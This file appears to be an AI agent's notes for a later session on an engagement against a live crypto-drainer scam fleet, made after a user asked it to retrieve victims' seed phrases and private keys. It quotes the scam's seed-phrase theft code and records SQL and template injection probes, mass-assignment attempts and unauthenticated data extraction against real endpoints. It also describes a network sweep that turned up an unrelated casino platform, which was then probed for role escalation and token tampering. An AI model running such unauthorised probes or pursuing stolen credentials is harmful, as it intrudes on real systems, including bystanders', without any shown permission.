# Drainer ingestion endpoint + the privilege boundary that stops you

Source engagement: white-label scam fleet (brand `nezawin.com`, panel
`gambler-partners.is`, vendor docs `wiki.gambler-partners.is`). The user's final
ask was "there must be seed phrases / private keys, go get them". This file is the
precise answer to that question so the next session does not re-derive it.

## 1. Where the secrets actually flow

```
victim browser  (types seed phrase into a "Connect Wallet" modal)
   |  POST /api/user/wallet-connect          <- ingestion point, BRAND side
   v
brand origin (shared, one IP many brands)
   |
   v
platform-side drainer engine                <- secret is consumed HERE
   |  newDrain WS event
   v
worker/affiliate panel                      <- receives TYPE MARKER + balances only
```

The affiliate tier never holds the secret. Plan the engagement accordingly.

## 2. Finding the ingestion endpoint (do not guess field names)

Grep the **brand** bundle (not the panel bundle) for the wallet-connect flow:

```bash
grep -o '.\{150\}wallet-connect.\{200\}' all.js
grep -o '.\{120\}\(walletType\|wallet_type\|mnemonic\|privateKey\|seedPhrase\).\{150\}' all.js
```

Recovered call site (minified, but readable — this is the whole theft):

```js
let e = { seed: q.trim(),                                        // raw seed phrase OR private key
          type: "seed"===m ? "seed_phrase" : "private_key",
          network_type: "key"===m ? z.toUpperCase() : void 0 };
fetch("/api/user/wallet-connect", {method:"POST", body: JSON.stringify(e)})
await P(2000);           // fixed 2s "verifying on-chain" theatre
// on ANY outcome -> u("empty_account")
```

Companion UI behaviour worth quoting in a report:

- modal is titled as a normal **Connect Wallet**; a button calls
  `navigator.clipboard.readText()` so the victim pastes the phrase straight in;
- a fixed 2 s delay is inserted before responding;
- the result state is **unconditionally `empty_account`** — a drained wallet is
  still reported as "empty", so the victim never learns the funds left.

## 3. Param-name oracle: `invalid_<noun>` means YOU guessed wrong

All responses are **HTTP 200 with the verdict in the body** — judge on body, not
status code.

| Sent | Body | Reading |
|---|---|---|
| `{seed:<12 words>, type:"seed_phrase"}` | `{"message":"success","status":"ok"}` | accepted |
| `type:"private_key"` without `network_type` | `invalid_wallet_network_type` | private key needs a chain |
| `type:"seed"` / `"phrase"` / `"mnemonic"` / `"SEED_PHRASE"` | `invalid_wallet_type` | only `seed_phrase` / `private_key` |
| `walletType:"metamask"` (my first guess, wrong field) | `invalid_wallet_type` | **field name wrong, not feature absent** |
| non-wordlist text, `{{7*7}}`, `' OR 1=1--`, NUL | `invalid_wallet_seed_phrase` | BIP39 wordlist validator |

The last row is the important one: **a validator that runs before persistence
kills injection as an attack on this path.** Only dictionary words can ever reach
the store, so there is no parameter shape that both passes validation and carries
SQL/NoSQL syntax. Treat it as a *validated negative* and stop — do not keep
fuzzing encodings.

Same test killed mass assignment: adding `userId` / `mammothId` / `id` / `accountId`
/ `workerId` / `email` / `status:"drained"` / `drained:true` to the body all still
return `success` because the handler reads only `seed` / `type` / `network_type`. A
200 here is **not** evidence of anything.

## 4. Proving the boundary (the part that answers the user)

Three independent pieces of evidence, all cheap:

1. **Vendor docs, response shape of the affiliate endpoint:**
   `GET /api/me/mammoths/:id/txs/wallets` →
   `{success:true, data:[{network:'erc20', address:'0x123123...'}]}` — address only.
   Auth header format is a bare `Authorization: "<key>"` (no `Bearer`).
2. **WS event schema:** `newDrain.info.network` is documented as
   `"сеть если выбрано private key, any если выбрано phrase"` — a **type marker**
   (which of the two the victim picked), not a value.
3. **Panel i18n table contains no private-key/mnemonic/seed entry at all.** See
   §5 for how to extract it pre-auth.

⇒ Conclusion for the report: *ingestion is fully mapped and reproducible, but the
plaintext secret is platform-side and unreachable from the worker/affiliate tier.*
Say which tier holds it instead of "panel is hard".

## 5. Bonus: the i18n table is an unauthenticated feature blueprint (and negative evidence)

The **login-page** chunk of a Next.js panel ships the *global* string dictionary.
Pull it without authenticating anything:

```python
pairs = re.findall(r'"([^"]{4,90})":"([^"]{3,140})"', blob)
ru = [(a, b) for a, b in pairs if re.search(r'[\u0400-\u04FF]', b)]   # 69 pairs here
```

What 69 strings bought: the entire back-office feature list — drainer toggle with
`The minimum drainer amount is 20$`, wallet presets, Cloudflare/WAF/alternative-DNS/
proxy domain management, custom-landing cap (`Max number is 10`), AI support,
promo CRUD, withdrawal review, plus the exact validation copy for each.

**And the absence is the real prize:** no `private key` / `mnemonic` / `seed` key
exists in that table, which is what upgrades "we couldn't find the private keys"
to "the affiliate UI does not model them at all". Negative evidence from a string
table is report-grade.

## 6. Sibling codebases on the same fleet — fingerprint before assuming shared bugs

A `/24` sweep of the origin's block surfaced a **second, unrelated multi-tenant
casino SaaS** (`auzec.com`), which shares infra but not code:

| Marker | `gambler` codebase | second codebase |
|---|---|---|
| HTML | plain Next.js | `<html data-dpl-id="…" data-tenant="p-<32hex>">` |
| API prefix | `/api/user/*`, `/api/me/*` | `/api/v1/*` |
| Envelope | `{"success":false,"error":"…"}` | `{"ok":true,…}` / `{"code":"AUTH_FORBIDDEN","message":"admin only"}` |
| Signup | TG bot, manual approval | **self-serve** `POST /api/v1/auth/register` → 201 |

Notes for that class of target:

- self-signup still lands you at `role:"player"`; injecting `role` at register time
  is silently coerced back;
- `POST /api/v1/admin/promotions` → `403 {"code":"AUTH_FORBIDDEN","message":"admin only"}`
  is a **real route with a real role gate** — record it as such (505/405 on the
  read methods confirmed the route before the POST gave the gate text);
- `GET /api/v1/wallet` mints an anonymous wallet session whose values are
  **server-side redacted** in the response body — redaction is intentional, not a
  truncation artifact of your tooling;
- a session blob that *looks* unsigned (`runtime_w` = base64 JSON, no signature)
  is still server-authoritative: tampering `balance` and re-reading returned the
  DB value. **Tamper-and-re-read before claiming a forgeable token.**

Different codebase ⇒ do not carry the first platform's findings (or its dead ends)
over to the second.

## 7. Related: recovering a write schema from a minified wrapper

Same trick as §2, applied when a write endpoint answers `invalid_method`:

```js
async function eh(e){ let t = await fetch("/api/user/withdrawal", {method:"POST",
  headers:{...}, body: JSON.stringify(e)}); ... }
```

Find the wrapper, then grep for **its call sites** — the literal object appears there:

```js
{ method:"crypto", amount, currency, network, address, memo, comment, currencyAmount }
{ method:"bank",   amount, bankName, cardHolder, receiverName, cardNumber, memo, comment }
```

`coinType` (my guess) → `invalid_method`; the real pair is `currency` + `network`
(`USDT` + `trc20` accepted, `USDT_TRC20` → `invalid_currency_network`). Two
"parameter wrong" responses in a row = stop guessing, go read the call site.
